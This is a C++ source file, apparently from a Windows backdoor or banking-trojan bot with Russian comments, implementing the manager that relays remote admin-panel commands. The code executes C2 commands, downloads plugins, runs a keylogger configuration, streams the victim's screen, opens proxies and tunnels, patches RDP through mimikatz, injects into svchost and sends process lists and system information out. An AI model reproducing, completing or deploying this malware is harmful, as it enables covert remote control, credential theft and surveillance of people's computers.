#include "main.h"
#include "Manager.h"
#include "AdminPanel.h"
#include "task.h"
#include "VideoServer.h"
#include "core\file.h"
#include "MonitoringProcesses.h"
#include "other.h"
#include "info.h"
#include "core\crypt.h"
#include "core\service.h"
#include "plugins.h"

static void HandlerManagerServer( Pipe::AutoMsg msg, DWORD tag );
static void HandlerMimikatzRDP( Pipe::AutoMsg msg, DWORD tag );
static void HandlerVideoServerConnect( Pipe::AutoMsg msg, DWORD tag );
static void HandlerVideoServerDisconnect( Pipe::AutoMsg msg, DWORD tag );
static void HandlerVideoServerRestart( Pipe::AutoMsg msg, DWORD tag );

ManagerServer::ManagerServer()
{
	currPipeInet = -1;
}

ManagerServer::~ManagerServer()
{
}

int ManagerServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case CmdReg:
			{
				MsgReg* msg = (MsgReg*)msgIn->data;
				PipeInet pipe;
				Str::Copy( pipe.name, sizeof(pipe.name), msg->namePipe );
				pipe.priority = msg->priority;
				pipesInet.Add(pipe);
				DbgMsg( "Зарегистрирован канал общения через инет: '%s'", msg->namePipe );
				GetNewPipeInet();
			}
			break;
		case CmdRegTask:
			pipeTaskServer = (char*)msgIn->data;
			DbgMsg( "Зарегистрирован канал сервера выполнения задач: '%s'", pipeTaskServer.c_str() );
			break;
		case CmdRegVideo:
			pipeVideoServer = (char*)msgIn->data;
			DbgMsg( "Зарегистрирован канал видео сервера: '%s'", pipeVideoServer.c_str() );
			break;
		case CmdRegMonProcesses:
			pipeMonProcesses = (char*)msgIn->data;
			DbgMsg( "Зарегистрирован канал мониторинга процессов: '%s'", pipeMonProcesses.c_str() );
			break;
		case CmdGetCmd:
		case CmdSendData:
		case CmdLoadFile:
		case CmdLoadPlugin:
		case CmdHttpProxy:
		case CmdIpPortProxy:
		case CmdSetProxy:
		case CmdDelProxy:
		case CmdDupl:
		case CmdNewAdminka:
		case CmdSendDataCrossGet:
		case CmdLog:
		case CmdRedirect:
			HandlerAsync( HandlerManagerServer, msgIn, (DWORD)this );
			break;
		case CmdGetProxy:
			{
				int nc = GetPipeInet();
				if( nc >= 0 )
				{
					PipeClient pipe(pipesInet[nc]->name);
					pipe.Request( PipeInetRequest::CmdGetProxy, msgIn->data, msgIn->sz_data, result );
				}
				else
				{
					result.Clear();
					int count = 0;
					result.Append( &count, sizeof(count) );
				}
				*msgOut = result.Ptr();
				ret = result.Len();
			}
			break;
		case CmdCmdExec:
			TaskServer::ExecTask( pipeTaskServer, (char*)msgIn->data, msgIn->sz_data );
			break;
		case CmdAddSharedFile:
			{
				SharedFile* file = (SharedFile*)Mem::Duplication( msgIn->data, msgIn->sz_data );
				AddSharedFile(file);
			}
			break;
		case CmdGetSharedFile:
			for( int i = 0; i < sharedFiles.Count(); i++ )
			{
				SharedFile* file = sharedFiles[i];
				if( Str::Cmp( file->name, (char*)msgIn->data ) == 0 )
				{
					*msgOut = file->data;
					ret = file->c_data;
				}
			}
			break;
		case CmdGetGlobalState:
			{
				PipeClient pipe(pipeTaskServer);
				pipe.Request( TaskServer::CmdGetGlobalState, msgIn->data, msgIn->sz_data, result );
				*msgOut = result.Ptr();
				ret = result.Len();
			}
			break;
		case CmdSetGlobalState:
			{
				PipeClient pipe(pipeTaskServer);
				pipe.Request( TaskServer::CmdSetGlobalState, msgIn->data, msgIn->sz_data, result );
				*msgOut = result.Ptr();
				ret = result.Len();
			}
			break;
		case CmdAddStartCmd:
			PipeClient::Send( pipeTaskServer, TaskServer::CmdAddStartCmd, msgIn->data, msgIn->sz_data );
			break;
#ifdef ON_VIDEOSERVER
		case CmdVideo:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdVideo, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoSendFirstFrame:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdFirstFrame, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoStop:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdVideoOff, msgIn->data, msgIn->sz_data );
			break;
		case CmdSendFileToVideoServer:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdSendFile, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoServerTunnel:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdTunnel, msgIn->data, msgIn->sz_data );
			break;
		case CmdAddVideoServers:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdAddServers, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoSendFolderPack:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdPackSendFolder, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoSendLog:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdSendLog, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoCreateLog:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdCreateLog, msgIn->data, msgIn->sz_data, msgIn->answer, msgIn->func, msgIn->tag );
			break;
		case CmdCreateStream:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdCreateStream, msgIn->data, msgIn->sz_data, msgIn->answer, msgIn->func, msgIn->tag );
			break;
		case CmdCloseStream:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdCloseStream, msgIn->data, msgIn->sz_data, msgIn->answer, msgIn->func, msgIn->tag );
			break;
		case CmdSendStreamData:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdSendStreamData, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoServerSendStr:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdSendStr, msgIn->data, msgIn->sz_data );
			break;
		case CmdVideoServerConnected:
			if( *((int*)msgIn->data) )
				HandlerAsync( HandlerVideoServerConnect, msgIn );
			else
				HandlerAsync( HandlerVideoServerDisconnect, msgIn );
			break;
		case CmdVideoServerRestart:
			PipeClient::Send( pipeVideoServer, CmdDisconnect, 0, 0 );
			HandlerAsync( HandlerVideoServerRestart, msgIn );
			break;
		case CmdLoadPluginServer:
			PipeClient::Send( pipeVideoServer, VideoPipeServer::CmdLoadPlugin, msgIn->data, msgIn->sz_data, msgIn->answer, msgIn->func, msgIn->tag );
			break;
#endif
#ifdef ON_MIMIKATZ
		case CmdMimikatzPatchRDP:
			HandlerAsync( HandlerMimikatzRDP, msgIn );
			PipeClient::Send( pipeMonProcesses, MonProcessServer::CmdRDP, 0, 0 );
			break;
#endif
	}
	return ret;
}

void ManagerServer::Disconnect()
{
	DbgMsg( "Менеджер отключен" );
	PipeClient::Send( pipeVideoServer, CmdDisconnect, 0, 0 );
	PipeClient::Send( pipeTaskServer, CmdDisconnect, 0, 0 );
	PipeClient::Send( pipeMonProcesses, CmdDisconnect, 0, 0 );

	//только 1-му зарегистрированому каналу связи с инетом шлем команду на отключение, так как именно он находится в свцхосте
	if( pipesInet.Count() > 0 )
		PipeClient::Send( pipesInet[0]->name, CmdDisconnect, 0, 0 );

	Delay(1000); //задержка чтобы все получили и отработали
}

void HandlerManagerServer( Pipe::AutoMsg msg, DWORD tag )
{
	ManagerServer* manager = (ManagerServer*)tag;
	manager->HandlerCmdAdminPanel(msg);
}

void ManagerServer::HandlerCmdAdminPanel( Pipe::Msg* msg )
{
	int nc = -1;
	//ждем пока зарегистрируется канал общения с админкойd
	for( int i = 0; i < 50; i++ )
	{
		nc = GetPipeInet();
		if( nc >= 0 ) break;
		Delay(100);
	} 
	if( nc >= 0 )
	{
		const char* namePipe = pipesInet[nc]->name;
		switch( msg->cmd )
		{
			case CmdGetCmd:
				PipeInetRequest::GetCmd( namePipe, msg->func, msg->answer );
				break;
			case CmdSendData:
				{
					bool log = false;
					AdminPanel::MsgSendData* sd = (AdminPanel::MsgSendData*)msg->data;
					for( int i = 0; i < redirects.Count(); i++ )
					{
						Redirect* r = redirects[i];
						if( Str::Cmp( sd->nameData, r->name ) == 0 )
						{
							DbgMsg( "Перенаправили %s в лог %d", r->name, r->logId );
							SendVideoLog( r->logId, sd->data, sd->c_data );
							log = true;
							break;
						}
					}
					if( !log )
						PipeInetRequest::SendData( namePipe, (AdminPanel::MsgSendData*)msg->data, msg->sz_data );
				}
				break;
			case CmdLoadFile:
				PipeInetRequest::LoadFile( namePipe, (char*)msg->data, msg->func, msg->answer, msg->tag );
				break;
			case CmdLoadPlugin:
				PipeInetRequest::LoadPlugin( namePipe, (char*)msg->data, msg->func, msg->answer, msg->tag );
				break;
			case CmdHttpProxy:
				PipeClient::Send( namePipe, PipeInetRequest::CmdTunnelHttp, msg->data, msg->sz_data );
				break;
			case CmdIpPortProxy:
				PipeClient::Send( namePipe, PipeInetRequest::CmdTunnelIpPort, msg->data, msg->sz_data );
				break;
			case CmdSetProxy:
			case CmdDelProxy:
				{
					int cmd = msg->cmd == CmdSetProxy ? PipeInetRequest::CmdSetProxy : PipeInetRequest::CmdDelProxy;
					for( int i = 0; i < pipesInet.Count(); i++ )
						PipeClient::Send( pipesInet[i]->name, cmd, msg->data, msg->sz_data );
				}
				break;
			case CmdDupl:
				PipeClient::Send( namePipe, PipeInetRequest::CmdDupl, msg->data, msg->sz_data );
				break;
			case CmdNewAdminka:
				PipeClient::Send( namePipe, PipeInetRequest::CmdNewAdminka, msg->data, msg->sz_data );
				break;
			case CmdSendDataCrossGet:
				PipeClient::Send( namePipe, PipeInetRequest::CmdSendDataCrossGet, msg->data, msg->sz_data );
				break;
			case CmdLog:
				PipeClient::Send( namePipe, PipeInetRequest::CmdLog, msg->data, msg->sz_data );
				break;
			case CmdRedirect:
				{
					Redirect r;
					r.logId = *((int*)msg->data);
					Str::Copy( r.name, sizeof(r.name), (char*)msg->data + 4 );
					redirects.Add(r);
					DbgMsg( "Добавили перенаправление с %s в лог %d", r.name, r.logId );
				}
				break;
		}
	}
}

static void HandlerMimikatzRDP( Pipe::AutoMsg msg, DWORD tag )
{
#ifdef ON_MIMIKATZ

	Service::Start( _CS_("TermService") );
	bool res = mimikatz::PatchRDP();
	Pipe::SendAnswer( msg, msg->cmd, &res, sizeof(res) );

#endif
}

int ManagerServer::GetNewPipeInet()
{
	int priority = -1;
	int n = -1;
	for( int i = 0; i < pipesInet.Count(); i++ )
	{
		if( pipesInet[i]->priority > priority )
		{
			priority = pipesInet[i]->priority;
			n = i;
		}
	}
	currPipeInet = n;
	return n;
}

//нужно реализовать проверку
int ManagerServer::GetPipeInet()
{
	return currPipeInet;
}

void ManagerServer::AddSharedFile( SharedFile* file )
{
	const char* name = file->name;
	//смотрим может уже есть такой файл
	for( int i = 0; i < sharedFiles.Count(); i++ )
	{
		SharedFile* sf = sharedFiles[i];
		if( Str::Cmp( file->name, sf->name ) == 0 )
		{
			//обновляем данные
			Mem::Free(sf);
			sharedFiles[i] = file;
			DbgMsg( "Обновлен общий файл: '%s', size: %d", file->name, file->c_data );
			file = 0;
		}
	}
	if( file ) 
	{
		DbgMsg( "Добавлен общий файл: '%s', size: %d", file->name, file->c_data );
		sharedFiles.Add(file);
	}
	if( Str::Cmp( name, _CS_("klgconfig") ) == 0 )
	{
		PipeClient::Send( pipeMonProcesses, MonProcessServer::CmdUpdateKlg, 0, 0 );
	}
}

bool ManagerServer::RegAdminPanel( PipePoint* pipe, int priority )
{
	ManagerServer::MsgReg msg;
	Str::Copy( msg.namePipe, sizeof(msg.namePipe), pipe->GetName(), pipe->GetName().Len() );
	msg.priority = priority;
	return PipeClient::Send( Config::nameManager, CmdReg, &msg, sizeof(msg) );
}

bool ManagerServer::RegTaskServer( PipePoint* pipe )
{
	return PipeClient::Send( Config::nameManager, CmdRegTask, pipe->GetName(), pipe->GetName().Len() + 1 );
}

bool ManagerServer::RegVideoServer( PipePoint* pipe )
{
	return PipeClient::Send( Config::nameManager, CmdRegVideo, pipe->GetName(), pipe->GetName().Len() + 1 );
}

bool ManagerServer::RegMonitoringProcesses( PipePoint* pipe )
{
	return PipeClient::Send( Config::nameManager, CmdRegMonProcesses, pipe->GetName(), pipe->GetName().Len() + 1 );
}

bool ManagerServer::GetAdminCmd( Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer )
{
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	return PipeClient::Send( Config::nameManager, CmdGetCmd, 0, 0, serverAnswer->GetName(), func );
}

bool ManagerServer::SendData( const char* nameData, const void* data, int c_data, bool file, const char* fileName )
{
	int size = sizeof(AdminPanel::MsgSendData) + c_data;
	AdminPanel::MsgSendData* sd = (AdminPanel::MsgSendData*)Mem::Alloc(size);
	if( !sd ) return false;
	Str::Copy( sd->nameData, sizeof(sd->nameData), nameData );
	StringBuilderStack<64> nameProcess;
	Process::Name(nameProcess);
	Str::Copy( sd->nameProcess, sizeof(sd->nameProcess), nameProcess, nameProcess.Len() );
	sd->hprocess = (uint)API(KERNEL32, GetCurrentProcess)();
	sd->file = file;
	Str::Copy( sd->fileName, sizeof(sd->fileName), fileName );
	sd->c_data = c_data;
	Mem::Copy( sd->data, data, c_data );
	bool ret = PipeClient::Send( Config::nameManager, CmdSendData, sd, size );
	Mem::Free(sd);
	return ret;
}

bool ManagerServer::CmdExec( const char* cmd, int len )
{
	if( len < 0 ) len = Str::Len(cmd);
	return PipeClient::Send( Config::nameManager, CmdCmdExec, cmd, len );
}

bool ManagerServer::LoadFile( StringBuilder& url, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	return PipeClient::Send( Config::nameManager, CmdLoadFile, url.c_str(), url.Len() + 1, serverAnswer->GetName(), func, tag );
}

bool ManagerServer::ExecRequest( int typeHost, StringBuilder& file, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
	StringBuilder url;
	switch( typeHost )
	{
		case AdminPanel::DEF: url += (char)0x01; break;
		case AdminPanel::AZ: url += (char)0x02; break;
		case -1: break; //хост указан в file (там полный урл)
		default:
			return false;
	}
	url += file;
	return LoadFile( url, func, serverAnswer, tag );
}

bool ManagerServer::LoadPlugin( StringBuilder& plugin, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
	if( GetGlobalState(Task::GlobalState_Plugin) == '0' )
		return LoadPluginAdminka( plugin, func, serverAnswer, tag );
	else
		return LoadPluginServer( plugin, func, serverAnswer, tag );
}

bool ManagerServer::LoadPluginAdminka( StringBuilder& plugin, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	return PipeClient::Send( Config::nameManager, CmdLoadPlugin, plugin.c_str(), plugin.Len() + 1, serverAnswer->GetName(), func, tag );
}

bool ManagerServer::LoadPluginServer( StringBuilder& plugin, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	return PipeClient::Send( Config::nameManager, CmdLoadPluginServer, plugin.c_str(), plugin.Len() + 1, serverAnswer->GetName(), func, tag );
}

bool ManagerServer::StartVideo( const char* nameVideo, DWORD pid )
{
#ifdef ON_VIDEOSERVER
	VideoPipeServer::MsgVideo msg;
	Str::Copy( msg.nameVideo, sizeof(msg.nameVideo), nameVideo );
	msg.pid = pid;
	return PipeClient::Send( Config::nameManager, CmdVideo, &msg, sizeof(msg) );
#else
	return false;
#endif
}

bool ManagerServer::SendFirstVideoFrame()
{
#ifdef ON_VIDEOSERVER
	return PipeClient::Send( Config::nameManager, CmdVideoSendFirstFrame, 0, 0 );
#else
	return false;
#endif
}

bool ManagerServer::StopVideo()
{
#ifdef ON_VIDEOSERVER
	return PipeClient::Send( Config::nameManager, CmdVideoStop, 0, 0 );
#else
	return false;
#endif
}

bool ManagerServer::SendFileToVideoServer( const char* typeName, const char* fileName, const char* ext, const void* data, int c_data )
{
#ifdef ON_VIDEOSERVER
	int c_data2 = sizeof(VideoPipeServer::MsgSendFile) + c_data;
	Mem::Data data2(c_data2);
	if( c_data2 != data2.SetLen(c_data2) ) return false;
	VideoPipeServer::MsgSendFile* msg = (VideoPipeServer::MsgSendFile*)data2.Ptr();
	Str::Copy( msg->typeName, sizeof(msg->typeName), typeName );
	Str::Copy( msg->fileName, sizeof(msg->fileName), fileName );
	Str::Copy( msg->ext, sizeof(msg->ext), ext );
	msg->c_data = c_data;
	Mem::Copy( msg->data, data, c_data );
	return PipeClient::Send( Config::nameManager, CmdSendFileToVideoServer, data2.Ptr(), data2.Len() );
#else
	return false;
#endif
}

bool ManagerServer::SendFolderPackToVideoServer( const char* srcFolder, const char* dstFolder, const char* typeName, const char* fileName, int globalId, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
#ifdef ON_VIDEOSERVER
	VideoPipeServer::MsgSendFolderPack* msg = (VideoPipeServer::MsgSendFolderPack*)Mem::Alloc(sizeof(VideoPipeServer::MsgSendFolderPack));
	if( !msg ) return false;
	Str::Copy( msg->srcFolder, sizeof(msg->srcFolder), srcFolder );
	Str::Copy( msg->dstFolder, sizeof(msg->dstFolder), dstFolder );
	Str::Copy( msg->typeName, sizeof(msg->typeName), typeName );
	Str::Copy( msg->fileName, sizeof(msg->fileName), fileName );
	msg->globalId = globalId;
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	bool res = PipeClient::Send( Config::nameManager, CmdVideoSendFolderPack, msg, sizeof(VideoPipeServer::MsgSendFolderPack), serverAnswer->GetName(), func, tag );
	Mem::Free(msg);
	return res;
#else
	return false;
#endif
}

bool ManagerServer::StartVideoServerTunnel( int port, const char* pipeName )
{
#ifdef ON_VIDEOSERVER
	int len = Str::Len(pipeName);
	Mem::Data data( sizeof(port) + 1 + len );
	data.Append( &port, sizeof(port) );
	data.AppendStr( pipeName, len );
	return PipeClient::Send( Config::nameManager, CmdVideoServerTunnel, data.Ptr(), data.Len() );
#else
	return false;
#endif
}

bool ManagerServer::SendVideoLog( uint idStream, const char* text, int len )
{
#ifdef ON_VIDEOSERVER
	if( len < 0 ) len = Str::Len(text);
	Mem::Data data( sizeof(uint) + len );
	data.Append( &idStream, sizeof(idStream) );
	data.Append( text, len );
	return PipeClient::Send( Config::nameManager, CmdVideoSendLog, data.Ptr(), data.Len() );
#else
	return false;
#endif
}

bool ManagerServer::CreateVideoLog( const char* nameLog, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
#ifdef ON_VIDEOSERVER
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	return PipeClient::Send( Config::nameManager, CmdVideoCreateLog, nameLog, Str::Len(nameLog), serverAnswer->GetName(), func, tag );
#else
	return false;
#endif
}

bool ManagerServer::CreateVideoStream( int typeId, const char* typeName, const char* fileName, const char* ext, Pipe::typeReceiverPipeAnswer func, PipePoint* serverAnswer, DWORD tag )
{
#ifdef ON_VIDEOSERVER
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	Mem::Data data(256);
	data.Append( &typeId, sizeof(typeId) );
	data.AppendStr(typeName);
	data.AppendStr(fileName);
	data.AppendStr(ext);
	return PipeClient::Send( Config::nameManager, CmdCreateStream, data.Ptr(), data.Len(), serverAnswer->GetName(), func, tag );
#else
	return false;
#endif
}

struct CreateVideoStreamStru
{
	HANDLE event;
	uint idStream;
};

static void IdStreamRecv( Pipe::AutoMsg msg, DWORD tag )
{
	CreateVideoStreamStru* cvss = (CreateVideoStreamStru*)tag;
	if( msg->sz_data >= sizeof(uint) )
		cvss->idStream = *((uint*)msg->data);
	API(KERNEL32, SetEvent)(cvss->event);
}

uint ManagerServer::CreateVideoStream( int typeId, const char* typeName, const char* fileName, const char* ext,  int wait )
{
	uint ret = 0;
	HANDLE event = API(KERNEL32, CreateEventA)( 0, TRUE, FALSE, 0 );
	if( !event ) return false;
	CreateVideoStreamStru* cvss = (CreateVideoStreamStru*)Mem::Alloc( sizeof(CreateVideoStreamStru) );
	cvss->event = event;
	cvss->idStream = 0;
	if( CreateVideoStream( typeId, typeName, fileName, ext, IdStreamRecv, 0, (DWORD)cvss ) )
	{
		if( API(KERNEL32, WaitForSingleObject)( cvss->event, wait ) == WAIT_OBJECT_0 ) 
		{
			ret = cvss->idStream;
			Mem::Free(cvss);
		}
	}
	API(KERNEL32, CloseHandle)(event);
	return ret;
}

bool ManagerServer::SendVideoStream( uint idStream, const void* data, int c_data )
{
#ifdef ON_VIDEOSERVER
	Mem::Data data2( sizeof(uint) + c_data );
	data2.Append( &idStream, sizeof(idStream) );
	data2.Append( data, c_data );
	return PipeClient::Send( Config::nameManager, CmdSendStreamData, data2.Ptr(), data2.Len() );
#else
	return false;
#endif
}

bool ManagerServer::CloseStream( uint idStream )
{
#ifdef ON_VIDEOSERVER
	return PipeClient::Send( Config::nameManager, CmdCloseStream, &idStream, sizeof(idStream) );
#else
	return false;
#endif
}

bool ManagerServer::AddVideoServers( bool force, AddressIpPort* addr, int c_addr )
{
#ifdef ON_VIDEOSERVER
	if( addr == 0 && c_addr <= 0 ) return false;
	VideoServer::StruAddServers addServers;
	addServers.force = force;
	addServers.count = c_addr;
	Mem::Data data( sizeof(c_addr) + sizeof(AddressIpPort) * c_addr );
	data.Append( &addServers, sizeof(addServers) );
	for( int i = 0; i < c_addr; i++ )
		data.Append( &addr[i], sizeof(AddressIpPort) );
	return PipeClient::Send( Config::nameManager, CmdAddVideoServers, data.Ptr(), data.Len() );
#else
	return false;
#endif
}

bool ManagerServer::VideoServerRestart( const char* nameUser )
{
#ifdef ON_VIDEOSERVER
	if( nameUser == MAIN_USER || nameUser == 0 )
		return PipeClient::Send( Config::nameManager, CmdVideoServerRestart, nullptr, 0 );
	else
		return PipeClient::Send( Config::nameManager, CmdVideoServerRestart, nameUser, Str::Len(nameUser) + 1 );
#else
	return false;
#endif
}

#ifdef ON_VIDEOSERVER

static void HandlerVideoServerConnect( Pipe::AutoMsg msg, DWORD tag )
{
	DbgMsg( "Сконнектились с видеосервером" );
	StringBuilder comment;
	GetEnvironmentComment(comment);
	VideoPipeServer::SendStr( 1, 0, comment );
}

static void HandlerVideoServerDisconnect( Pipe::AutoMsg msg, DWORD tag )
{
	DbgMsg( "Разрыв связи с видеосервером" );
}

static void HandlerVideoServerRestart( Pipe::AutoMsg msg, DWORD tag )
{
	char* nameUser = (char*)msg->data;
	if( msg->sz_data )
		DbgMsg( "Перезапуск видео под юзером %s", nameUser );
	else
	{
		nameUser = MAIN_USER;
		DbgMsg( "Перезапуск видео под главным юзером" );
	}
	Delay(1000); //отключение видео было в обработчике команд, здесь ждем пока отключится
	VideoServer::RunInSvchost(nameUser);
}

#endif

bool ManagerServer::AddSharedFile( const char* name, const void* data, int c_data )
{
	int sz = sizeof(SharedFile) + c_data;
	SharedFile* file = (SharedFile*)Mem::Alloc(sz);
	Str::Copy( file->name, sizeof(file->name), name );
	Mem::Copy( file->data, data, c_data );
	file->c_data = c_data;
	return PipeClient::Send( Config::nameManager, CmdAddSharedFile, file, sz );
}

bool ManagerServer::GetSharedFile( const char* name, Mem::Data& data )
{
	PipeClient pipe(Config::nameManager);
	bool res = pipe.Request( CmdGetSharedFile, name, Str::Len(name) + 1, data );
	if( res && data.Len() > 0 )
		return true;
	else
		return false;
}

#ifdef ON_MIMIKATZ

bool ManagerServer::MimikatzPathRDP( Pipe::typeReceiverPipeAnswer func, DWORD tag, PipePoint* serverAnswer )
{
	if( serverAnswer == 0 ) serverAnswer = Pipe::serverPipeResponse;
	return PipeClient::Send( Config::nameManager, CmdMimikatzPatchRDP, 0, 0, serverAnswer->GetName(), func, tag );
}

#endif

bool ManagerServer::StartHttpProxy( int port )
{
	return PipeClient::Send( Config::nameManager, CmdHttpProxy, &port, sizeof(port) );
}

bool ManagerServer::StartIpPortProxy( int port, AddressIpPort& addr )
{
	Mem::Data data( sizeof(port) + sizeof(addr) );
	data.Append( &port, sizeof(port) );
	data.Append( &addr, sizeof(addr) );
	return PipeClient::Send( Config::nameManager, CmdIpPortProxy, data.Ptr(), data.Len() );
}

static bool CmdProxy( int cmd, Proxy::Info* proxy, int c_proxy )
{
	if( proxy == 0 || c_proxy <= 0 ) return false;
	Mem::Data data( sizeof(c_proxy) + sizeof(Proxy::Info) * c_proxy );
	data.Append( &c_proxy, sizeof(c_proxy) );
	data.Append( proxy, sizeof(Proxy::Info) * c_proxy );
	return PipeClient::Send( Config::nameManager, cmd, data.Ptr(), data.Len() );
}

bool ManagerServer::SetProxy( Proxy::Info* proxy, int c_proxy )
{
	return CmdProxy( CmdSetProxy, proxy, c_proxy );
}

bool ManagerServer::DelProxy( Proxy::Info* proxy, int c_proxy )
{
	return CmdProxy( CmdDelProxy, proxy, c_proxy );
}

char ManagerServer::GetGlobalState( int id )
{
	PipeClient pipe(Config::nameManager);
	Mem::Data res;
	if( pipe.Request( CmdGetGlobalState, &id, sizeof(id), res ) )
		return res.p_char()[0];
	else
		return '0';
}

char ManagerServer::SetGlobalState( int id, char v )
{
	PipeClient pipe(Config::nameManager);
	char data[5];
	*((int*)data) = id;
	data[4] = v;
	Mem::Data res;
	if( pipe.Request( CmdSetGlobalState, data, sizeof(data), res ) )
		return res.p_char()[0];
	else
		return '0';
}

bool ManagerServer::AddStartCmd( const StringBuilder& cmd )
{
	return PipeClient::Send( Config::nameManager, CmdAddStartCmd, cmd.c_str(), cmd.Len() + 1 );
}

bool ManagerServer::DuplData( uint hashData, int dst )
{
	Mem::Data data(8);
	data.Append( &hashData, sizeof(hashData) );
	data.Append( &dst, sizeof(dst) );
	return PipeClient::Send( Config::nameManager, CmdDupl, data.Ptr(), data.Len() );
}

bool ManagerServer::SetNewHostsAdminki( StringBuilder& s )
{
	return PipeClient::Send( Config::nameManager, ManagerServer::CmdNewAdminka, s.c_str(), s.Len() );
}

bool ManagerServer::SendResExecutedCmd( const StringBuilder& cmd, int err, const char* comment )
{
	StringBuilderStack<64> s;
	s = _CS_("rescmd=");
	s += cmd;
	s += '|';
	s += _CS_("err=");
	s += err;
	if( comment )
	{
		s += ',';
		s += comment;
	}
	return PipeClient::Send( Config::nameManager, ManagerServer::CmdSendDataCrossGet, s.c_str(), s.Len() + 1 );
}

bool ManagerServer::SendLog( bool flush, int code )
{
	AdminPanel::MsgLog m;
	m.flush = flush;
	m.code = code;
	return PipeClient::Send( Config::nameManager, ManagerServer::CmdLog, &m, sizeof(m) );
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static void HandlerGetCmd( Pipe::AutoMsg msg, DWORD )
{
	ManagerServer::CmdExec( (char*)msg->data, msg->sz_data - 1 );
}

static void HandlerAddKeyloggerConfigFile( Pipe::AutoMsg msg, DWORD )
{
	DbgMsg( "Загружен klgconfig.plug" );
	if( msg->sz_data > 0 )
	{
		StringBuilder s( msg->sz_data + 1, (char*)msg->data, msg->sz_data );
		//в текстовом файле конец строки \r\n, но может быть и только \n, поэтому убираем \r, чтобы привести к одному виду
		s.ReplaceChar( '\r', 0 );
		s.Lower();
		ManagerServer::AddSharedFile( _CS_("klgconfig"), s );
		Delay(1000);
	}
}

//выполняет комманды сразу после запуска бота
static DWORD WINAPI FirstExecuteCommands( void* )
{
	while( !Config::fileNameConfig[0] ) Delay(1000); //пока не станет известно имя файла конфига, при инсталяции нужно ждать
	ManagerServer::CmdExec( _CS_("loadconfig") );
	Delay(1000); //ждем пока выполнится отстук
	if( Config::state & PLUGINS_SERVER ) //качать плагины с сервера
	{
		ManagerServer::SetGlobalState( Task::GlobalState_Plugin, '1' );
	}
	LoadKeyloggerConfig();
#ifdef ON_MIMIKATZ
	//mimikatz::SendAllLogonsThread();
#endif
	StringBuilder comment;
	GetEnvironmentComment(comment);
	ManagerServer::SendData( _CS_("info.txt"), comment.c_str(), comment.Len(), false );
	Plugins::Execute();
	SendListProcess(1); //отсылка списка процессов в админку
	ManagerServer::CmdExec( _CS_("runmem wi.exe") );
	return 0;
}

void LoadKeyloggerConfig()
{
	StringBuilderStack<64> name( _CS_("klgconfig.plug") );
	ManagerServer::LoadPlugin( name, HandlerAddKeyloggerConfigFile );
}

void ManagerLoop( bool runAdminPanel )
{
	ManagerServer* manager = new ManagerServer();
	GeneralPipeServer* general = new GeneralPipeServer();
#ifndef NOT_EXPLORER
	if( !runAdminPanel ) //процесс работы с админкой будет запущен другим процессом, поэтому имя канала берем из конфигурации
	{
		manager->SetName(Config::nameManager);
	}
#endif
	if( manager )
	{
		if( Config::state & EXTERN_NAME_MANAGER )
			manager->SetName(Config::nameManager);
		else//сохраняем имя управляющего канала, он будет копироваться во все процессы в которые внедряемся
			Str::Copy( Config::nameManager, sizeof(Config::nameManager), manager->GetName(), manager->GetName().Len() );
		if( manager->StartAsync(false) )
		{
			general->StartAsync(false);
			DbgMsg( "Запущен менеджер, имя канала '%s'", manager->GetName().c_str() );
			if( runAdminPanel ) 
			{
				Delay(1000); //ждем пока запустится канал админки
				RunAdminPanelInSvchost();
			}
			Delay(2000); //немного ждем пока зарегистрируется канал общения с админкой
			RunThread( FirstExecuteCommands, 0 );
			//цикл остука
			while( manager->IsValid() )
			{
				DbgMsg( "Запрос команды" );
				ManagerServer::GetAdminCmd(HandlerGetCmd);
				API(KERNEL32, Sleep)(Config::waitPeriod);
				//LASTINPUTINFO pii;
				//pii.cbSize = sizeof(pii);
				//GetLastInputInfo( &pii );
				//DbgMsg( "*** %d", GetTickCount() - pii.dwTime );
			}
			delete manager;
		}
	}
}

DWORD WINAPI ManagerLoopThread( void* param )
{
	ManagerLoop( param != 0 );
	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static void MakeNameGeneralPipe( StringBuilder& name )
{
	Crypt::Name( _CS_("GeneralPipe"), Config::XorMask, name );
}

